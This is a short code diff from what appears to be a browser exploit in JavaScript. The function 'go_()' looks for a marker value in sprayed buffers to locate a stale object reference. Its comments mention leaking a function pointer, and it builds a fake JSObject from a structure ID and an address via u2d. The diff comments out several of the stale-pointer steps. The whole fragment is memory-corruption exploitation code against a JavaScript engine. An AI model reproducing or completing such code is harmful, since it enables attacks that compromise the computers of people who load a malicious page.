@@ -186,7 +186,6 @@ function go_() {
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
 				alert("Found the object!!");
-				return;
 				
 				// Leak function pointer
 				//stale[0] = fc;
@@ -197,10 +196,10 @@ function go_() {
 				
 				//var original_val = bufs[i][k];
 				//var original_val1 = bufs[i][k+1];
-				alert("Pushed stale");
-				bufs.push(stale);
-				stale[0] = fc;
-				fcp = bufs[i][k];
+				//alert("Pushed stale");
+				//bufs.push(stale);
+				//stale[0] = fc;
+				//fcp = bufs[i][k];
 				structID = 100;
 				stale[0] = {
 					'a': u2d(structID, 0x1172600), // the JSObject properties
